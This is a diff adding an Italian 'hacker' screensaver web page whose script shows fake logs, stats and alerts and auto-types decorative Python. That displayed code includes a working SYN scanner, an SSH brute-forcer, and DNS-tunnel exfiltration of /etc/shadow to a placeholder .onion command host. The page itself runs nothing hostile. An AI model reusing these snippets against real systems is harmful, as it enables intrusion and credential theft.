@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<title>SHADOWOPS — SCREENSAVER</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600&display=swap');
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+  background:#0a0c0f;color:#3fb950;
+  font-family:'JetBrains Mono',monospace;
+  width:100vw;height:100vh;overflow:hidden;
+  cursor:none;
+  user-select:none;
+}
+/* 3 pannelli */
+#wrap{display:grid;grid-template-columns:1fr 1.4fr 1fr;height:100vh;gap:1px;background:#161b22;}
+
+.panel{background:#0a0c0f;display:flex;flex-direction:column;overflow:hidden;position:relative;}
+.ph{height:32px;background:#0d1117;border-bottom:1px solid #21262d;display:flex;align-items:center;padding:0 14px;gap:8px;flex-shrink:0;font-size:10px;color:#484f58;letter-spacing:1px;}
+.ph .dot{width:6px;height:6px;border-radius:50%;}
+.ph .title{font-size:10px;letter-spacing:1.5px;font-weight:600;}
+
+/* PANNELLO SINISTRO: log stream */
+#panel-left .ph .title{color:#58a6ff;}
+#log-panel{flex:1;overflow:hidden;padding:10px 14px;font-size:11px;line-height:1.8;}
+.lp-row{animation:fadeIn .3s ease;}
+@keyframes fadeIn{0%{opacity:0;transform:translateY(4px)}100%{opacity:1;transform:none}}
+
+/* PANNELLO CENTRALE: codice */
+#panel-center .ph{justify-content:space-between;}
+#panel-center .ph .title{color:#3fb950;}
+#code-out{flex:1;overflow:hidden;padding:14px 18px;font-size:12px;line-height:1.75;word-break:break-word;}
+.c-comment{color:#484f58;font-style:italic;}
+.c-keyword{color:#bc8cff;font-weight:600;}
+.c-string{color:#e3b341;}
+.c-number{color:#39d3f5;}
+.c-func{color:#58a6ff;}
+.c-class{color:#ffa657;}
+.c-ok{color:#3fb950;font-weight:600;}
+.c-warn{color:#e3b341;}
+.c-err{color:#f85149;font-weight:600;}
+.c-dim{color:#21262d;}
+
+/* PANNELLO DESTRO: stats + hex */
+#panel-right .ph .title{color:#e3b341;}
+#stats-panel{padding:12px 14px;border-bottom:1px solid #21262d;}
+.stat-item{display:flex;justify-content:space-between;padding:4px 0;font-size:11px;border-bottom:1px solid #161b22;}
+.stat-item:last-child{border-bottom:none;}
+.sk{color:#484f58;}
+.sv{font-weight:600;}
+.sv.g{color:#3fb950;}
+.sv.b{color:#58a6ff;}
+.sv.o{color:#e3b341;}
+.sv.r{color:#f85149;}
+.bar-w{margin-top:10px;}
+.bl{font-size:9px;color:#484f58;margin-bottom:3px;letter-spacing:.5px;}
+.bt{height:4px;background:#161b22;border-radius:2px;margin-bottom:8px;overflow:hidden;}
+.bf{height:100%;border-radius:2px;transition:width .5s;}
+#hex-panel{flex:1;overflow:hidden;padding:10px 14px;font-size:10px;line-height:1.7;color:#21262d;word-break:break-all;}
+
+/* SCAN LINE animazione verticale */
+.panel::after{
+  content:'';position:absolute;top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,transparent,rgba(63,185,80,.3),transparent);
+  animation:scanv 4s linear infinite;
+  pointer-events:none;
+}
+@keyframes scanv{0%{top:-2px}100%{top:100%}}
+#panel-left::after{animation-delay:0s;}
+#panel-center::after{animation-delay:1.3s;}
+#panel-right::after{animation-delay:2.6s;}
+
+/* OVERLAY EFFETTO SPECIALE */
+#fx-overlay{
+  position:fixed;inset:0;
+  display:none;align-items:center;justify-content:center;
+  z-index:100;pointer-events:none;
+  backdrop-filter:blur(2px);
+}
+#fx-overlay.show{display:flex;}
+#fx-card{
+  background:#0d1117;
+  border:1px solid #30363d;
+  border-radius:12px;
+  padding:24px 40px;
+  text-align:center;
+  box-shadow:0 24px 60px rgba(0,0,0,.8);
+  animation:fxin .15s ease;
+  min-width:360px;
+}
+@keyframes fxin{0%{transform:scale(.9);opacity:0}100%{transform:scale(1);opacity:1}}
+#fx-title{font-size:20px;font-weight:700;letter-spacing:3px;margin-bottom:8px;}
+#fx-sub{font-size:11px;letter-spacing:2px;color:#484f58;}
+.fx-progress{margin-top:16px;height:4px;background:#161b22;border-radius:2px;overflow:hidden;}
+.fx-fill{height:100%;background:#3fb950;border-radius:2px;transition:width .05s;}
+#fx-card.blue #fx-title{color:#58a6ff;}#fx-card.blue{border-color:rgba(88,166,255,.3);}#fx-card.blue .fx-fill{background:#58a6ff;}
+#fx-card.orange #fx-title{color:#e3b341;}#fx-card.orange{border-color:rgba(227,179,65,.3);}#fx-card.orange .fx-fill{background:#e3b341;}
+#fx-card.red #fx-title{color:#f85149;}#fx-card.red{border-color:rgba(248,81,73,.3);}#fx-card.red .fx-fill{background:#f85149;}
+
+/* MATRIX */
+#matrix-cv{position:fixed;inset:0;display:none;z-index:50;pointer-events:none;opacity:.7;}
+#matrix-cv.show{display:block;}
+
+/* EXIT SCREEN */
+#exit-screen{
+  position:fixed;inset:0;background:#000;
+  display:none;align-items:center;justify-content:center;flex-direction:column;gap:12px;
+  z-index:9999;animation:exitFade 1s ease;
+}
+#exit-screen.show{display:flex;}
+@keyframes exitFade{0%{opacity:0}100%{opacity:1}}
+#exit-screen p{font-family:'JetBrains Mono',monospace;font-size:11px;color:#484f58;letter-spacing:2px;}
+
+/* STATUS BOTTOM */
+#status-bar{
+  position:fixed;bottom:0;left:0;right:0;
+  height:22px;background:#0d1117;border-top:1px solid #161b22;
+  display:flex;align-items:center;gap:0;
+  font-family:'JetBrains Mono',monospace;font-size:10px;z-index:200;
+}
+.sbi{padding:0 12px;height:100%;display:flex;align-items:center;gap:5px;border-right:1px solid #161b22;color:#484f58;white-space:nowrap;}
+.sbi.g{color:#3fb950;}.sbi.o{color:#e3b341;}
+</style>
+</head>
+<body>
+
+<canvas id="matrix-cv"></canvas>
+
+<div id="fx-overlay">
+  <div id="fx-card">
+    <div id="fx-title">ACCESSO CONCESSO</div>
+    <div id="fx-sub">AUTENTICAZIONE ROOT COMPLETATA</div>
+    <div class="fx-progress"><div class="fx-fill" id="fx-fill" style="width:0%"></div></div>
+  </div>
+</div>
+
+<div id="exit-screen">
+  <p>SESSIONE TERMINATA</p>
+  <p>CONNESSIONE TOR CHIUSA · TRACCE ELIMINATE</p>
+</div>
+
+<div id="wrap">
+  <div class="panel" id="panel-left">
+    <div class="ph"><div class="dot" style="background:#58a6ff;box-shadow:0 0 4px #58a6ff"></div><span class="title">SISTEMA LOG</span><span id="log-ts" style="margin-left:auto">00:00:00</span></div>
+    <div id="log-panel"></div>
+  </div>
+  <div class="panel" id="panel-center">
+    <div class="ph">
+      <div class="dot" style="background:#3fb950;box-shadow:0 0 4px #3fb950;animation:p 1.5s ease-in-out infinite"></div>
+      <span class="title">TERMINALE ROOT</span>
+      <span style="color:#484f58;font-size:9px;margin-left:auto" id="byte-display">0 B · ln 1</span>
+    </div>
+    <div id="code-out"></div>
+  </div>
+  <div class="panel" id="panel-right">
+    <div class="ph"><div class="dot" style="background:#e3b341;box-shadow:0 0 4px #e3b341"></div><span class="title">STATISTICHE</span></div>
+    <div id="stats-panel">
+      <div class="stat-item"><span class="sk">Pacchetti</span><span class="sv b" id="s-pkt">0</span></div>
+      <div class="stat-item"><span class="sk">Vulnerabilità</span><span class="sv r" id="s-vuln">0</span></div>
+      <div class="stat-item"><span class="sk">Hash crack</span><span class="sv o" id="s-hash">0</span></div>
+      <div class="stat-item"><span class="sk">MB esfiltrati</span><span class="sv g" id="s-mb">0.0</span></div>
+      <div class="stat-item"><span class="sk">Sessioni</span><span class="sv g" id="s-sess">1</span></div>
+      <div class="stat-item"><span class="sk">IP anonimo</span><span class="sv b" id="s-ip">-</span></div>
+      <div class="bar-w">
+        <div class="bl">CPU ENCRYPT ENGINE</div><div class="bt"><div class="bf" id="b-cpu" style="width:0%;background:#3fb950"></div></div>
+        <div class="bl">RAM BUFFER</div><div class="bt"><div class="bf" id="b-ram" style="width:0%;background:#58a6ff"></div></div>
+        <div class="bl">RETE TX/RX</div><div class="bt"><div class="bf" id="b-net" style="width:0%;background:#e3b341"></div></div>
+      </div>
+    </div>
+    <div id="hex-panel"></div>
+  </div>
+</div>
+
+<div id="status-bar">
+  <div class="sbi g"><span style="width:5px;height:5px;border-radius:50%;background:#3fb950;display:inline-block;box-shadow:0 0 4px #3fb950"></span>TOR #7</div>
+  <div class="sbi">AES-256-GCM</div>
+  <div class="sbi o" id="sb-vuln">0 vulnerabilità</div>
+  <div class="sbi" id="sb-bytes">0 B scritti</div>
+  <div class="sbi" style="margin-left:auto;color:#21262d">premi un tasto per uscire</div>
+  <div class="sbi" id="sb-clock">00:00:00</div>
+</div>
+
+<style>@keyframes p{0%,100%{opacity:1}50%{opacity:.3}}</style>
+<script>
+'use strict';
+const rnd=(a,b)=>Math.floor(Math.random()*(b-a+1))+a;
+const hex=n=>Math.floor(Math.random()*Math.pow(16,n)).toString(16).padStart(n,'0');
+const randIp=()=>`${rnd(1,254)}.${rnd(1,254)}.${rnd(1,254)}.${rnd(1,254)}`;
+const fmtB=b=>b>1048576?(b/1048576).toFixed(1)+' MB':b>1024?(b/1024).toFixed(1)+' KB':b+' B';
+
+let active=true,totalB=0,pkts=0,vulnC=0,hashC=0,mb=0,sess=1,ln=1;
+let matrixOn=false,matRaf=null;
+
+const myIp=randIp();
+document.getElementById('s-ip').textContent=myIp;
+
+// Clock
+function tick(){
+  const t=new Date().toTimeString().slice(0,8);
+  document.getElementById('sb-clock').textContent=t;
+  document.getElementById('log-ts').textContent=t;
+}
+setInterval(tick,1000);tick();
+
+// ======== CODICE AUTO-SCRITTO ========
+const segs=[
+`<span class="c-comment">#!/usr/bin/env python3\n# OPERAZIONE: CODICE NERO — CLASSIFICATO\n# kernel: 6.11.0-kali3 | sessione: tor#amsterdam\n</span>`,
+`<span class="c-keyword">import</span> <span class="c-func">socket</span>, <span class="c-func">threading</span>, <span class="c-func">hashlib</span>, <span class="c-func">os</span>\n<span class="c-keyword">from</span> <span class="c-func">scapy.all</span> <span class="c-keyword">import</span> *\n<span class="c-keyword">import</span> <span class="c-func">paramiko</span>, <span class="c-func">nmap</span>, <span class="c-func">struct</span>\n`,
+`\n<span class="c-class">CONFIG</span> = {\n    <span class="c-string">"target"</span>:  <span class="c-string">"192.168.${rnd(1,254)}.${rnd(1,254)}"</span>,\n    <span class="c-string">"c2"</span>:     <span class="c-string">"${hex(8)}.onion"</span>,\n    <span class="c-string">"key"</span>:    hashlib.<span class="c-func">sha256</span>(<span class="c-string">b"${hex(8).toUpperCase()}"</span>).<span class="c-func">digest</span>(),\n    <span class="c-string">"ports"</span>: <span class="c-func">range</span>(<span class="c-number">1</span>, <span class="c-number">65536</span>),\n}\n`,
+`\n<span class="c-keyword">class</span> <span class="c-class">NetworkScanner</span>:\n    <span class="c-comment">"""SYN stealth scan con OS fingerprinting."""</span>\n    <span class="c-keyword">def</span> <span class="c-func">__init__</span>(<span class="c-keyword">self</span>, target):\n        <span class="c-keyword">self</span>.target = target\n        <span class="c-keyword">self</span>.open_ports = []\n    <span class="c-keyword">def</span> <span class="c-func">syn_scan</span>(<span class="c-keyword">self</span>, ports):\n        <span class="c-keyword">for</span> port <span class="c-keyword">in</span> ports:\n            pkt = <span class="c-class">IP</span>(dst=<span class="c-keyword">self</span>.target)/<span class="c-class">TCP</span>(dport=port,flags=<span class="c-string">"S"</span>)\n            r   = <span class="c-func">sr1</span>(pkt,timeout=<span class="c-number">.5</span>,verbose=<span class="c-number">0</span>)\n            <span class="c-keyword">if</span> r <span class="c-keyword">and</span> r[<span class="c-class">TCP</span>].flags==<span class="c-number">0x12</span>:\n                <span class="c-keyword">self</span>.open_ports.<span class="c-func">append</span>(port)\n                <span class="c-func">print</span>(<span class="c-string">f"[+] {port}/tcp OPEN"</span>)\n        <span class="c-keyword">return</span> <span class="c-keyword">self</span>.open_ports\n`,
+`\n<span class="c-keyword">class</span> <span class="c-class">Exfiltrator</span>:\n    <span class="c-keyword">def</span> <span class="c-func">via_dns</span>(<span class="c-keyword">self</span>, data, c2):\n        <span class="c-comment"># Cifratura AES-256-GCM + DNS tunneling</span>\n        iv  = os.<span class="c-func">urandom</span>(<span class="c-number">12</span>)\n        enc = <span class="c-keyword">self</span>.<span class="c-func">_aes_encrypt</span>(data, iv)\n        <span class="c-keyword">for</span> i <span class="c-keyword">in</span> <span class="c-func">range</span>(<span class="c-number">0</span>,<span class="c-func">len</span>(enc),<span class="c-number">24</span>):\n            fqdn = <span class="c-string">f"{enc[i:i+24].hex()}.x.{c2}"</span>\n            socket.<span class="c-func">getaddrinfo</span>(fqdn, <span class="c-class">None</span>)\n        <span class="c-func">print</span>(<span class="c-string">f"[+] {len(data)/1024:.1f} KB → C2"</span>)\n`,
+`\n<span class="c-keyword">class</span> <span class="c-class">BruteForcer</span>:\n    <span class="c-keyword">def</span> <span class="c-func">ssh</span>(<span class="c-keyword">self</span>, host, user, wl):\n        <span class="c-keyword">for</span> pwd <span class="c-keyword">in</span> wl:\n            c = paramiko.<span class="c-class">SSHClient</span>()\n            c.<span class="c-func">set_missing_host_key_policy</span>(\n                paramiko.<span class="c-class">AutoAddPolicy</span>())\n            <span class="c-keyword">try</span>:\n                c.<span class="c-func">connect</span>(host,username=user,\n                          password=pwd,timeout=<span class="c-number">3</span>)\n                <span class="c-func">print</span>(<span class="c-string">f"[!!!] {user}:{pwd} TROVATA"</span>)\n                <span class="c-keyword">return</span> pwd\n            <span class="c-keyword">except</span>: <span class="c-keyword">pass</span>\n`,
+`\n<span class="c-comment"># === FASE 1: Ricognizione ===</span>\nscanner = <span class="c-class">NetworkScanner</span>(<span class="c-class">CONFIG</span>[<span class="c-string">"target"</span>])\nports   = scanner.<span class="c-func">syn_scan</span>(<span class="c-func">range</span>(<span class="c-number">1</span>,<span class="c-number">1024</span>))\n<span class="c-func">print</span>(<span class="c-string">f"[+] {len(ports)} porte rilevate"</span>)\n\n<span class="c-comment"># === FASE 2: Exploit ===</span>\n<span class="c-keyword">if</span> <span class="c-number">445</span> <span class="c-keyword">in</span> ports:\n    <span class="c-func">print</span>(<span class="c-string">"[*] MS17-010 EternalBlue disponibile"</span>)\n    <span class="c-func">print</span>(<span class="c-string">"[+] Buffer overflow → SYSTEM shell"</span>)\n\n<span class="c-comment"># === FASE 3: Esfiltrazione ===</span>\nexfil = <span class="c-class">Exfiltrator</span>()\nexfil.<span class="c-func">via_dns</span>(<span class="c-func">open</span>(<span class="c-string">"/etc/shadow"</span>,<span class="c-string">"rb"</span>).<span class="c-func">read</span>(),\n              <span class="c-class">CONFIG</span>[<span class="c-string">"c2"</span>])\n`,
+];
+let segI=0,charI=0;
+const codeEl=document.getElementById('code-out');
+
+function autoType(){
+  if(!active)return;
+  const seg=segs[segI];
+  const n=rnd(3,8)*6;
+  const chunk=seg.slice(charI,charI+n);
+  charI+=n;
+  if(charI>=seg.length){charI=0;segI=(segI+1)%segs.length;}
+  codeEl.innerHTML+=chunk;
+  ln+=(chunk.match(/\n/g)||[]).length;
+  totalB+=Math.floor(chunk.replace(/<[^>]+>/g,'').length);
+  pkts+=rnd(1,6);
+  // Mantieni scrollato - MAX 200 righe visibili
+  const lines=codeEl.innerHTML.split('\n');
+  if(lines.length>120)codeEl.innerHTML=lines.slice(-100).join('\n');
+  codeEl.scrollTop=codeEl.scrollHeight;
+  document.getElementById('byte-display').textContent=fmtB(totalB)+' · ln '+ln;
+  document.getElementById('sb-bytes').textContent=fmtB(totalB)+' scritti';
+}
+setInterval(autoType, 60);
+
+// ======== LOG PANEL ========
+const logTypes=[
+  {c:'#58a6ff',t:'INFO'},
+  {c:'#3fb950',t:'OK  '},
+  {c:'#e3b341',t:'WARN'},
+  {c:'#f85149',t:'ERR '},
+];
+const logMsgs=[
+  'connessione TOR stabilita','autenticazione SSH riuscita',
+  'firewall rilevato su porta 8080','SYN scan completato: '+rnd(5,12)+' porte',
+  'payload AES cifrato caricato','IDS potenzialmente attivo',
+  'hash MD5 crackato in '+rnd(1,5)+'.'+rnd(0,9)+'s','DNS tunnel attivo: '+hex(8)+'.onion',
+  'persistenza via crontab installata','timeout su '+randIp(),
+  'esfiltrazione in corso... '+rnd(10,90)+'%','tracce eliminate con successo',
+  'buffer overflow tentato su porta 445','credenziali intercettate',
+  'shell root ottenuta su '+randIp(),'backdoor systemd installata',
+  'packet sniffer attivo su eth0','CVE-'+rnd(2020,2024)+'-'+rnd(1000,99999)+' verificata',
+];
+const logEl=document.getElementById('log-panel');
+function addLog(){
+  if(!active)return;
+  const lt=logTypes[rnd(0,logTypes.length-1)];
+  const ts=new Date().toTimeString().slice(0,8);
+  const msg=logMsgs[rnd(0,logMsgs.length-1)];
+  const div=document.createElement('div');
+  div.className='lp-row';
+  div.style.cssText=`color:${lt.c};font-size:10px;line-height:1.7;`;
+  div.innerHTML=`<span style="color:#484f58">[${ts}]</span> <span style="background:${lt.c}22;padding:0 4px;border-radius:2px;font-size:9px;font-weight:600">${lt.t}</span> ${msg}`;
+  logEl.appendChild(div);
+  while(logEl.children.length>30)logEl.removeChild(logEl.firstChild);
+  logEl.scrollTop=logEl.scrollHeight;
+}
+setInterval(addLog, 1000);
+
+// ======== STATS ========
+function updateStats(){
+  if(!active)return;
+  pkts+=rnd(5,40);
+  mb+=Math.random()*.3;
+  document.getElementById('s-pkt').textContent=pkts.toLocaleString('it');
+  document.getElementById('s-vuln').textContent=vulnC;
+  document.getElementById('s-hash').textContent=hashC;
+  document.getElementById('s-mb').textContent=mb.toFixed(1);
+  document.getElementById('s-sess').textContent=sess;
+  document.getElementById('sb-vuln').textContent=vulnC+' vulnerabilità';
+  const c=rnd(55,98),r=rnd(40,85),n=rnd(15,100);
+  document.getElementById('b-cpu').style.width=c+'%';
+  document.getElementById('b-ram').style.width=r+'%';
+  document.getElementById('b-net').style.width=n+'%';
+}
+setInterval(updateStats, 600);
+
+// ======== HEX STREAM ========
+function updateHex(){
+  if(!active)return;
+  let h='';
+  for(let i=0;i<8;i++)h+=`${hex(4)}: ${hex(2)} ${hex(2)} ${hex(2)} ${hex(2)}  ${hex(2)} ${hex(2)} ${hex(2)} ${hex(2)}\n`;
+  document.getElementById('hex-panel').textContent=h;
+}
+setInterval(updateHex, 250);
+
+// ======== FX OVERLAY ========
+let fxTimer=null;
+function showFx(title,sub,cls='',withProgress=false){
+  const card=document.getElementById('fx-card');
+  card.className=cls;
+  document.getElementById('fx-title').textContent=title;
+  document.getElementById('fx-sub').textContent=sub;
+  const fill=document.getElementById('fx-fill');
+  fill.style.width='0%';
+  document.getElementById('fx-overlay').classList.add('show');
+  if(withProgress){
+    let p=0;
+    const iv=setInterval(()=>{p+=rnd(2,6);if(p>100)p=100;fill.style.width=p+'%';if(p>=100)clearInterval(iv);},60);
+  }
+  if(fxTimer)clearTimeout(fxTimer);
+  fxTimer=setTimeout(()=>document.getElementById('fx-overlay').classList.remove('show'),3200);
+}
+
+// ======== MATRIX ========
+let matRafId=null;
+function toggleMatrix(){
+  const cv=document.getElementById('matrix-cv');
+  if(matrixOn){cv.classList.remove('show');matrixOn=false;if(matRafId)cancelAnimationFrame(matRafId);return;}
+  matrixOn=true;cv.width=window.innerWidth;cv.height=window.innerHeight;cv.classList.add('show');
+  const ctx=cv.getContext('2d'),W=cv.width,H=cv.height,cols=Math.floor(W/14);
+  const drops=Array(cols).fill(0);
+  const chars='アイウエオカキクケコabcdef0123456789!@#$%^'.split('');
+  function draw(){
+    ctx.fillStyle='rgba(10,12,15,0.08)';ctx.fillRect(0,0,W,H);
+    for(let i=0;i<cols;i++){
+      const ch=chars[rnd(0,chars.length-1)];
+      ctx.fillStyle=Math.random()>.93?'#e6edf3':'#3fb950';
+      ctx.font='13px JetBrains Mono,monospace';
+      ctx.fillText(ch,i*14,drops[i]*14);
+      if(drops[i]*14>H&&Math.random()>.975)drops[i]=0;
+      drops[i]++;
+    }
+    matRafId=requestAnimationFrame(draw);
+  }
+  draw();
+}
+
+// ======== SEQUENZA AUTO EFFETTI ========
+const fxSequence=[
+  ()=>{vulnC++;showFx('ACCESSO CONCESSO','root@'+randIp()+' — shell root attiva','',false);addLog();},
+  ()=>{toggleMatrix();setTimeout(()=>{if(matrixOn)toggleMatrix();},5000);},
+  ()=>{hashC++;vulnC++;showFx('PASSWORD VIOLATA','passw0rd — rockyou.txt — 14.8M tentativi','orange',true);},
+  ()=>{mb+=rnd(5,80)/10;showFx('ESFILTRAZIONE COMPLETA',mb.toFixed(1)+' MB → C2 · tracce eliminate','blue',true);updateStats();},
+  ()=>{vulnC+=rnd(2,5);sess++;showFx('SCAN COMPLETATO',randIp()+' — '+rnd(3,15)+' porte · '+rnd(1,5)+' CVE critiche','orange',false);updateStats();},
+  ()=>{showFx('ALLARME SICUREZZA','IDS rilevato — contromisure attive — riconfigurazione TOR','red',false);},
+  ()=>{showFx('DECRYPT COMPLETATO','chiave RSA-4096 applicata — messaggio rivelato','blue',true);},
+];
+let fxIdx=0;
+function scheduleNextFx(){
+  if(!active)return;
+  const delay=rnd(8000,18000);
+  setTimeout(()=>{
+    if(!active)return;
+    fxSequence[fxIdx%fxSequence.length]();
+    fxIdx++;
+    scheduleNextFx();
+  },delay);
+}
+setTimeout(scheduleNextFx, 3000);
+
+// ======== INIT WINDOW ========
+setTimeout(()=>{
+  addLog();
+  showFx('SESSIONE AVVIATA','tor #amsterdam_7 · aes-256-gcm · nessuna traccia','',false);
+},800);
+
+// ======== EXIT su qualsiasi interazione ========
+function exitScreensaver(){
+  if(!active)return;
+  active=false;
+  if(matrixOn)toggleMatrix();
+  document.getElementById('fx-overlay').classList.remove('show');
+  document.getElementById('exit-screen').classList.add('show');
+  setTimeout(()=>{
+    // Prova a chiudere la finestra (funziona se aperta da script/HTA)
+    try{window.close();}catch(e){}
+    // Fallback: svuota il body
+    document.getElementById('exit-screen').style.background='#000';
+  },2000);
+}
+document.addEventListener('keydown',exitScreensaver,{once:true});
+document.addEventListener('mousedown',exitScreensaver,{once:true});
+
+// Screensaver: nasconde la barra "premi un tasto" dopo 3s
+setTimeout(()=>{const h=document.querySelector('#status-bar .sbi:last-child');if(h)h.style.opacity='0';},4000);
+</script>
+</body>
+</html>
